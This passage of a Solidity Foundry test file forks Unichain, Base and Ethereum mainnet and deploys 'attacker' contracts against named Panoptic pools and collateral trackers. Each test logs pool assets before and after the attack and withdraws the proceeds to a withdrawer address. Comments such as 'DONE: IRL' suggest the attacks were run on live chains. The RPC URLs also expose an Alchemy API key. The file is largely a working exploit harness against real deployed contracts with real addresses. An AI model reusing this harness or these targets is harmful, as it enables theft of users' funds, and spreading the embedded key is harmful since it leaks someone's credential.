        console.log("ct0.poolAssets after attack:", poolAssets0After);
        console.log("ct1.poolAssets after attack:", poolAssets1After);
        console.log("ETH.balanceOf UNICHAIN_POOL_MANAGER_V4 after attack:", address(UNICHAIN_POOL_MANAGER_V4).balance);
        console.log("USDT.balanceOf UNICHAIN_POOL_MANAGER_V4 after attack:", USDT.balanceOf(UNICHAIN_POOL_MANAGER_V4));

        console.log("balance of withdrawer before withdraw", WETH.balanceOf(withdrawer));
        vm.prank(withdrawer);
        attacker.withdraw(address(WETH), 100000000001);
        console.log("balance of withdrawer after withdraw", WETH.balanceOf(withdrawer));
    }

    // IN PROGRESS: TO TRY
    function test_unichain_attacker_testDeployableTakeFlashLoanAndAttack_Deployable_WBTC_USDT5bpsUnichainAttacker() public {
        vm.createSelectFork("https://unichain-mainnet.g.alchemy.com/v2/VN5K96b647acOyIXfX45zBdO53Dx7ZKm");

        IERC20Partial USDT = IERC20Partial(0x9151434b16b9763660705744891fA906F660EcC5); // usdt
        IERC20Partial WBTC = IERC20Partial(address(0x927B51f251480a681271180DA4de28D44EC4AfB8)); // wbtc
        ICollateralTracker tracker0 = ICollateralTracker(address(0x3281055789036D518EC148BCAAa35586Cbc8e6A6));
        ICollateralTracker tracker1 = ICollateralTracker(address(0xB8b4709Ae6012f76E63B2989B55125D7C0f04aAC));
        address pp = 0x0000eD265C5EDAa58C3eAF503F8bFE2ccaB1C0aD;

        (uint256 poolAssets0Before, , ) = tracker0.getPoolData();
        (uint256 poolAssets1Before, , ) = tracker1.getPoolData();
        console.log("ct0.poolAssets before attack:", poolAssets0Before);
        console.log("ct1.poolAssets before attack:", poolAssets1Before);
        console.log("USDT.balanceOf UNICHAIN_POOL_MANAGER_V4 before attack:", USDT.balanceOf(UNICHAIN_POOL_MANAGER_V4));
        console.log("WBTC.balanceOf UNICHAIN_POOL_MANAGER_V4 before attack:", WBTC.balanceOf(UNICHAIN_POOL_MANAGER_V4));

        // Deploy and attack in one call:
        bytes32 salt = bytes32(uint256(0x123));
        WBTC_USDT5bpsUnichainAttacker_Deployer attackerDeployer = new WBTC_USDT5bpsUnichainAttacker_Deployer{salt: salt}(withdrawer);
        console.log("AttackerDeployer deployed at:", address(attackerDeployer));
        WBTC_USDT5bpsUnichainAttacker attacker = attackerDeployer.attacker();
        console.log("Attacker deployed at:", address(attacker));

        console.log("USDT balance of attacker contract after attack:", USDT.balanceOf(address(attacker)));
        console.log("WBTC balance of attacker contract after attack:", WBTC.balanceOf(address(attacker)));

        (uint256 poolAssets0After, , ) = tracker0.getPoolData();
        (uint256 poolAssets1After, , ) = tracker1.getPoolData();
        console.log("ct0.poolAssets after attack:", poolAssets0After);
        console.log("ct1.poolAssets after attack:", poolAssets1After);
        console.log("USDT.balanceOf UNICHAIN_POOL_MANAGER_V4 after attack:", USDT.balanceOf(UNICHAIN_POOL_MANAGER_V4));
        console.log("WBTC.balanceOf UNICHAIN_POOL_MANAGER_V4 after attack:", WBTC.balanceOf(UNICHAIN_POOL_MANAGER_V4));

        console.log("balance of withdrawer before withdraw", WBTC.balanceOf(withdrawer));
        vm.prank(withdrawer);
        attacker.withdraw(address(WBTC), 111);
        console.log("balance of withdrawer after withdraw", WBTC.balanceOf(withdrawer));
    }

    // IN PROGRESS: TO TRY
    function test_unichain_attacker_testDeployableTakeFlashLoanAndAttack_Deployable_WBTC_USDC30bpsUnichainAttacker() public {
        vm.createSelectFork("https://unichain-mainnet.g.alchemy.com/v2/VN5K96b647acOyIXfX45zBdO53Dx7ZKm");

        IERC20Partial USDC = IERC20Partial(0x078D782b760474a361dDA0AF3839290b0EF57AD6); // usdc
        IERC20Partial WBTC = IERC20Partial(address(0x927B51f251480a681271180DA4de28D44EC4AfB8)); // wbtc
        ICollateralTracker tracker0 = ICollateralTracker(address(0x43B13eFb1Dc2eb5268B6C741255425644164abfA));
        ICollateralTracker tracker1 = ICollateralTracker(address(0xCc70877861950A069F700030CB9DF2e30eB8Ea65));
        address pp = 0x0000CC48DDBdE5b520b5Fd1130884c13192AB6AA;

        (uint256 poolAssets0Before, , ) = tracker0.getPoolData();
        (uint256 poolAssets1Before, , ) = tracker1.getPoolData();
        console.log("ct0.poolAssets before attack:", poolAssets0Before);
        console.log("ct1.poolAssets before attack:", poolAssets1Before);
        console.log("USDC.balanceOf UNICHAIN_POOL_MANAGER_V4 before attack:", USDC.balanceOf(UNICHAIN_POOL_MANAGER_V4));
        console.log("WBTC.balanceOf UNICHAIN_POOL_MANAGER_V4 before attack:", WBTC.balanceOf(UNICHAIN_POOL_MANAGER_V4));

        // Deploy and attack in one call:
        bytes32 salt = bytes32(uint256(0x123));
        WBTC_USDC30bpsUnichainAttacker_Deployer attackerDeployer = new WBTC_USDC30bpsUnichainAttacker_Deployer{salt: salt}(withdrawer);
        console.log("AttackerDeployer deployed at:", address(attackerDeployer));
        WBTC_USDC30bpsUnichainAttacker attacker = attackerDeployer.attacker();
        console.log("Attacker deployed at:", address(attacker));

        console.log("USDC balance of attacker contract after attack:", USDC.balanceOf(address(attacker)));
        console.log("WBTC balance of attacker contract after attack:", WBTC.balanceOf(address(attacker)));

        (uint256 poolAssets0After, , ) = tracker0.getPoolData();
        (uint256 poolAssets1After, , ) = tracker1.getPoolData();
        console.log("ct0.poolAssets after attack:", poolAssets0After);
        console.log("ct1.poolAssets after attack:", poolAssets1After);
        console.log("USDC.balanceOf UNICHAIN_POOL_MANAGER_V4 after attack:", USDC.balanceOf(UNICHAIN_POOL_MANAGER_V4));
        console.log("WBTC.balanceOf UNICHAIN_POOL_MANAGER_V4 after attack:", WBTC.balanceOf(UNICHAIN_POOL_MANAGER_V4));

        console.log("balance of withdrawer before withdraw", WBTC.balanceOf(withdrawer));
        vm.prank(withdrawer);
        attacker.withdraw(address(WBTC), 111);
        console.log("balance of withdrawer after withdraw", WBTC.balanceOf(withdrawer));
    }

    // IN PROGRESS: TO TRY
    function test_base_attacker_testDeployableTakeFlashLoanAndAttack_Deployable_WETH_cbBTC30bpsBaseAttacker() public {
        vm.createSelectFork("https://base-mainnet.g.alchemy.com/v2/VN5K96b647acOyIXfX45zBdO53Dx7ZKm");

        IERC20Partial WETH = IERC20Partial(0x4200000000000000000000000000000000000006);
        IERC20Partial cbBTC = IERC20Partial(0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf);
        ICollateralTracker tracker0 = ICollateralTracker(address(0x535BD2C411Cd9b8faE39a66BCb79065CC6255103));
        ICollateralTracker tracker1 = ICollateralTracker(address(0x49b4A3297152EEd8965bee50B7b3b381F8c321cf));
        address pp = 0x000005A05A34fa3bbb6C158ad843beA80657BaaA;

        (uint256 poolAssets0Before, , ) = tracker0.getPoolData();
        (uint256 poolAssets1Before, , ) = tracker1.getPoolData();
        console.log("ct0.poolAssets before attack:", poolAssets0Before);
        console.log("ct1.poolAssets before attack:", poolAssets1Before);
        console.log("WETH.balanceOf pp before attack:", WETH.balanceOf(pp));
        console.log("cbBTC.balanceOf pp before attack:", cbBTC.balanceOf(pp));

        // Deploy and attack in one call:
        bytes32 salt = bytes32(uint256(0x123));
        WETH_cbBTC30bpsBaseAttacker_Deployer attackerDeployer = new WETH_cbBTC30bpsBaseAttacker_Deployer{salt: salt}(withdrawer);
        console.log("AttackerDeployer deployed at:", address(attackerDeployer));
        WETH_cbBTC30bpsBaseAttacker attacker = attackerDeployer.attacker();
        console.log("Attacker deployed at:", address(attacker));

        console.log("USDC balance of attacker contract after attack:", WETH.balanceOf(address(attacker)));
        console.log("WBTC balance of attacker contract after attack:", cbBTC.balanceOf(address(attacker)));

        (uint256 poolAssets0After, , ) = tracker0.getPoolData();
        (uint256 poolAssets1After, , ) = tracker1.getPoolData();
        console.log("ct0.poolAssets after attack:", poolAssets0After);
        console.log("ct1.poolAssets after attack:", poolAssets1After);
        console.log("WETH.balanceOf pp after attack:", WETH.balanceOf(pp));
        console.log("cbBTC.balanceOf pp after attack:", cbBTC.balanceOf(pp));

        console.log("balance of withdrawer before withdraw", WETH.balanceOf(withdrawer));
        vm.prank(withdrawer);
        attacker.withdraw(address(WETH), 111);
        console.log("balance of withdrawer after withdraw", WETH.balanceOf(withdrawer));
    }

    // IN PROGRESS: TO TRY
    function test_unichain_attacker_testDeployableTakeFlashLoanAndAttack_Deployable_ETH_WBTC5bpsUnichainAttacker() public {
        vm.createSelectFork("https://unichain-mainnet.g.alchemy.com/v2/VN5K96b647acOyIXfX45zBdO53Dx7ZKm");

        // This attacker is going to keep its profits in WETH, despite token0 being ETH:
        IERC20Partial WETH = IERC20Partial(0x4200000000000000000000000000000000000006);
        IERC20Partial WBTC = IERC20Partial(address(0x927B51f251480a681271180DA4de28D44EC4AfB8)); // wbtc
        ICollateralTracker tracker0 = ICollateralTracker(address(0x852A20813830d4eCC4A4878E68C14CEA214B37a2));
        ICollateralTracker tracker1 = ICollateralTracker(address(0x29D72Ca95a4B301C0222569bb6EA589E908A406f));
        address pp = 0x00000344137B8eFBF9bDBa1D56CCa688dedA8CE5;

        (uint256 poolAssets0Before, , ) = tracker0.getPoolData();
        (uint256 poolAssets1Before, , ) = tracker1.getPoolData();
        console.log("ct0.poolAssets before attack:", poolAssets0Before);
        console.log("ct1.poolAssets before attack:", poolAssets1Before);
        console.log("ETH.balanceOf UNICHAIN_POOL_MANAGER_V4 before attack:", address(UNICHAIN_POOL_MANAGER_V4).balance);
        console.log("WBTC.balanceOf UNICHAIN_POOL_MANAGER_V4 before attack:", WBTC.balanceOf(UNICHAIN_POOL_MANAGER_V4));

        // Deploy and attack in one call:
        bytes32 salt = bytes32(uint256(0x123));
        ETH_WBTC5bpsUnichainAttacker_Deployer attackerDeployer = new ETH_WBTC5bpsUnichainAttacker_Deployer{salt: salt}(withdrawer);
        console.log("AttackerDeployer deployed at:", address(attackerDeployer));
        ETH_WBTC5bpsUnichainAttacker attacker = attackerDeployer.attacker();
        console.log("Attacker deployed at:", address(attacker));

        console.log("WETH balance of attacker contract after attack:", WETH.balanceOf(address(attacker)));
        console.log("ETH balance of attacker contract after attack (should be ~zero - we kept profits in WETH)", address(attacker).balance);
        console.log("WBTC balance of attacker contract after attack:", WBTC.balanceOf(address(attacker)));

        (uint256 poolAssets0After, , ) = tracker0.getPoolData();
        (uint256 poolAssets1After, , ) = tracker1.getPoolData();
        console.log("ct0.poolAssets after attack:", poolAssets0After);
        console.log("ct1.poolAssets after attack:", poolAssets1After);
        console.log("ETH.balanceOf UNICHAIN_POOL_MANAGER_V4 after attack:", address(UNICHAIN_POOL_MANAGER_V4).balance);
        console.log("WBTC.balanceOf UNICHAIN_POOL_MANAGER_V4 after attack:", WBTC.balanceOf(UNICHAIN_POOL_MANAGER_V4));

        console.log("balance of withdrawer before withdraw", WETH.balanceOf(withdrawer));
        vm.prank(withdrawer);
        attacker.withdraw(address(WETH), 100000000001);
        console.log("balance of withdrawer after withdraw", WETH.balanceOf(withdrawer));
    }

    /*
    DONE: IRL
    MultipoolMainnetAttacker multipoolAttacker;
    USDC_WETH30bpsMainnetAttacker usdcWethAttacker;
    WBTC_WETH30bpsMainnetAttacker wbtcWethAttacker;
    TBTC_WETH30bpsMainnetAttacker tbtcWethAttacker;
    WBTC_USDC30bpsMainnetAttacker wbtcUsdcAttacker;
    IERC20Partial mainnet_USDC = IERC20Partial(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20Partial mainnet_WETH = IERC20Partial(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20Partial mainnet_WBTC = IERC20Partial(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    IERC20Partial mainnet_TBTC = IERC20Partial(0x18084fbA666a33d37592fA2633fD49a74DD93a88);
    address usdcWethPP = 0x000000000000305B8621e2475aee38ab5721D525;
    address wbtcWethPP = 0x000000000000100921465982d28b37D2006e87Fc;
    address tbtcWethPP = 0x0d694230686C1973E8ED8b607f48D3B0Dc5A2bF1;
    address wbtcUsdcPP = 0x05b142597bedb8cA19BE81E97c684ede8C091DE8;
    ICollateralTracker usdcWethCT0 = ICollateralTracker(0xc74dC5908E3E421004f533287c052bF0cc42ddc1);
    ICollateralTracker usdcWethCT1 = ICollateralTracker(0x351eFb333885c5351418aE0134dd54cac0B3143F);
    ICollateralTracker wbtcWethCT0 = ICollateralTracker(0xb310cf625f519DA965c587e22Ff6Ecb49809eD09);
    ICollateralTracker wbtcWethCT1 = ICollateralTracker(0x1F8D600A0211DD76A8c1Ac6065BC0816aFd118ef);
    ICollateralTracker tbtcWethCT0 = ICollateralTracker(0xD832250205607FAFcf01c94971af0295f08aC631);
    ICollateralTracker tbtcWethCT1 = ICollateralTracker(0xe0b058AEbFed7e03494dA2644380F8C0BC706F1e);
    ICollateralTracker wbtcUsdcCT0 = ICollateralTracker(0x4cEeC889fB484E18522224E9C1d7b0fB8526D710);
    ICollateralTracker wbtcUsdcCT1 = ICollateralTracker(0x6a0B5d5aFfA5a0b7dD776Db96ee79F609394B5Da);

    uint256 usdcWeth_poolAssets0Before;
    uint256 usdcWeth_poolAssets1Before;
    uint256 wbtcWeth_poolAssets0Before;
    uint256 wbtcWeth_poolAssets1Before;
    uint256 tbtcWeth_poolAssets0Before;
    uint256 tbtcWeth_poolAssets1Before;
    uint256 wbtcUsdc_poolAssets0Before;
    uint256 wbtcUsdc_poolAssets1Before;

    function test_mainnet_attacker_testMultipoolAttacker() public {
        vm.createSelectFork("mainnet");

        {
            (usdcWeth_poolAssets0Before, , ) = usdcWethCT0.getPoolData();
            (usdcWeth_poolAssets1Before, , ) = usdcWethCT1.getPoolData();
            (wbtcWeth_poolAssets0Before, , ) = wbtcWethCT0.getPoolData();
            (wbtcWeth_poolAssets1Before, , ) = wbtcWethCT1.getPoolData();
            (tbtcWeth_poolAssets0Before, , ) = tbtcWethCT0.getPoolData();
            (tbtcWeth_poolAssets1Before, , ) = tbtcWethCT1.getPoolData();
            (wbtcUsdc_poolAssets0Before, , ) = wbtcUsdcCT0.getPoolData();
            (wbtcUsdc_poolAssets1Before, , ) = wbtcUsdcCT1.getPoolData();

            console.log("usdcWeth_ct0.poolAssets before attack:", usdcWeth_poolAssets0Before);
            console.log("usdcWeth_ct1.poolAssets before attack:", usdcWeth_poolAssets1Before);
            console.log("USDC.balanceOf usdcWeth PanopticPool before attack:", mainnet_USDC.balanceOf(usdcWethPP));
            console.log("WETH.balanceOf usdcWeth PanopticPool before attack:", mainnet_WETH.balanceOf(usdcWethPP));

            console.log("wbtcWeth_ct0.poolAssets before attack:", wbtcWeth_poolAssets0Before);
            console.log("wbtcWeth_ct1.poolAssets before attack:", wbtcWeth_poolAssets1Before);
            console.log("WBTC.balanceOf wbtcWeth PanopticPool before attack:", mainnet_WBTC.balanceOf(wbtcWethPP));
            console.log("WETH.balanceOf wbtcWeth PanopticPool before attack:", mainnet_WETH.balanceOf(wbtcWethPP));

            console.log("tbtcWeth_ct0.poolAssets before attack:", tbtcWeth_poolAssets0Before);
            console.log("tbtcWeth_ct1.poolAssets before attack:", tbtcWeth_poolAssets1Before);
            console.log("TBTC.balanceOf tbtcWeth PanopticPool before attack:", mainnet_TBTC.balanceOf(tbtcWethPP));
            console.log("WETH.balanceOf tbtcWeth PanopticPool before attack:", mainnet_WETH.balanceOf(tbtcWethPP));

            console.log("wbtcUsdc_ct0.poolAssets before attack:", wbtcUsdc_poolAssets0Before);
            console.log("wbtcUsdc_ct1.poolAssets before attack:", wbtcUsdc_poolAssets1Before);
            console.log("WBTC.balanceOf wbtcUsdc PanopticPool before attack:", mainnet_WBTC.balanceOf(wbtcUsdcPP));
            console.log("USDC.balanceOf wbtcUsdc PanopticPool before attack:", mainnet_USDC.balanceOf(wbtcUsdcPP));
        }

        // Deploy and attack in one call:
        multipoolAttacker = new MultipoolMainnetAttacker{salt: bytes32(uint256(0x123))}(withdrawer);
        console.log("AttackerDeployer deployed at:", address(multipoolAttacker));
        usdcWethAttacker = multipoolAttacker.usdcWethAttacker();
        wbtcWethAttacker = multipoolAttacker.wbtcWethAttacker();
        tbtcWethAttacker = multipoolAttacker.tbtcWethAttacker();
        wbtcUsdcAttacker = multipoolAttacker.wbtcUsdcAttacker();
        console.log("usdcWethAttacker deployed at:", address(usdcWethAttacker));
        console.log("wbtcWethAttacker deployed at:", address(wbtcWethAttacker));
        console.log("tbtcWethAttacker deployed at:", address(tbtcWethAttacker));
        console.log("wbtcUsdcAttacker deployed at:", address(wbtcUsdcAttacker));

        console.log("USDC balance of usdcWethAttacker contract after attack:", mainnet_USDC.balanceOf(address(usdcWethAttacker)));
        console.log("WETH balance of usdcWethAttacker contract after attack:", mainnet_WETH.balanceOf(address(usdcWethAttacker)));

        console.log("WBTC balance of wbtcWethAttacker contract after attack:", mainnet_WBTC.balanceOf(address(wbtcWethAttacker)));
        console.log("WETH balance of wbtcWethAttacker contract after attack:", mainnet_WETH.balanceOf(address(wbtcWethAttacker)));

        console.log("TBTC balance of tbtcWethAttacker contract after attack:", mainnet_TBTC.balanceOf(address(tbtcWethAttacker)));
        console.log("WETH balance of tbtcWethAttacker contract after attack:", mainnet_WETH.balanceOf(address(tbtcWethAttacker)));

        console.log("WBTC.balance of wbtcUsdcAttacker contract after attack:", mainnet_WBTC.balanceOf(address(wbtcUsdcAttacker)));
        console.log("USDC.balance of wbtcUsdcAttacker contract after attack:", mainnet_USDC.balanceOf(address(wbtcUsdcAttacker)));

        {
            (uint256 usdcWeth_poolAssets0After, , ) = usdcWethCT0.getPoolData();
            (uint256 usdcWeth_poolAssets1After, , ) = usdcWethCT1.getPoolData();
            (uint256 wbtcWeth_poolAssets0After, , ) = wbtcWethCT0.getPoolData();
            (uint256 wbtcWeth_poolAssets1After, , ) = wbtcWethCT1.getPoolData();
            (uint256 tbtcWeth_poolAssets0After, , ) = tbtcWethCT0.getPoolData();
            (uint256 tbtcWeth_poolAssets1After, , ) = tbtcWethCT1.getPoolData();
            (uint256 wbtcUsdc_poolAssets0After, , ) = wbtcUsdcCT0.getPoolData();
            (uint256 wbtcUsdc_poolAssets1After, , ) = wbtcUsdcCT1.getPoolData();

            console.log("usdcWeth_poolAssets0After after attack:", usdcWeth_poolAssets0After);
            console.log("usdcWeth_poolAssets1After after attack:", usdcWeth_poolAssets1After);
            console.log("USDC.balanceOf usdcWeth PanopticPool after attack:", mainnet_USDC.balanceOf(usdcWethPP));
            console.log("WETH.balanceOf usdcWeth PanopticPool after attack:", mainnet_WETH.balanceOf(usdcWethPP));

            console.log("wbtcWeth_poolAssets0After after attack:", wbtcWeth_poolAssets0After);
            console.log("wbtcWeth_poolAssets1After after attack:", wbtcWeth_poolAssets1After);
            console.log("WBTC.balanceOf wbtcWeth PanopticPool after attack:", mainnet_WBTC.balanceOf(wbtcWethPP));
            console.log("WETH.balanceOf wbtcWeth PanopticPool after attack:", mainnet_WETH.balanceOf(wbtcWethPP));

            console.log("tbtcWeth_poolAssets0After after attack:", tbtcWeth_poolAssets0After);
            console.log("tbtcWeth_poolAssets1After after attack:", tbtcWeth_poolAssets1After);
            console.log("TBTC.balanceOf tbtcWeth PanopticPool after attack:", mainnet_TBTC.balanceOf(tbtcWethPP));
            console.log("WETH.balanceOf tbtcWeth PanopticPool after attack:", mainnet_WETH.balanceOf(tbtcWethPP));

            console.log("wbtcUsdc_poolAssets0After after attack:", wbtcUsdc_poolAssets0After);
            console.log("wbtcUsdc_poolAssets1After after attack:", wbtcUsdc_poolAssets1After);
            console.log("WBTC.balanceOf wbtcUsdc PanopticPool after attack:", mainnet_WBTC.balanceOf(wbtcUsdcPP));
            console.log("USDC.balanceOf wbtcUsdc PanopticPool after attack:", mainnet_USDC.balanceOf(wbtcUsdcPP));
        }

        console.log("balance of withdrawer before withdraw", mainnet_WETH.balanceOf(withdrawer));
        vm.prank(withdrawer);
        usdcWethAttacker.withdraw(address(mainnet_WETH), 100000000001);
        console.log("balance of withdrawer after withdraw", mainnet_WETH.balanceOf(withdrawer));

        console.log("balance of withdrawer before second withdraw", mainnet_WETH.balanceOf(withdrawer));
        vm.prank(withdrawer);
        wbtcWethAttacker.withdraw(address(mainnet_WETH), 100000000001);
        console.log("balance of withdrawer after withdraw", mainnet_WETH.balanceOf(withdrawer));

        console.log("balance of withdrawer before third withdraw", mainnet_WETH.balanceOf(withdrawer));
        vm.prank(withdrawer);
        tbtcWethAttacker.withdraw(address(mainnet_WETH), 100000000001);
        console.log("balance of withdrawer after withdraw", mainnet_WETH.balanceOf(withdrawer));

        console.log("balance of withdrawer before first WBTC withdraw", mainnet_WBTC.balanceOf(withdrawer));
        vm.prank(withdrawer);
        wbtcUsdcAttacker.withdraw(address(mainnet_WBTC), 100);
        console.log("balance of withdrawer after withdraw", mainnet_WBTC.balanceOf(withdrawer));
    }
    */
}
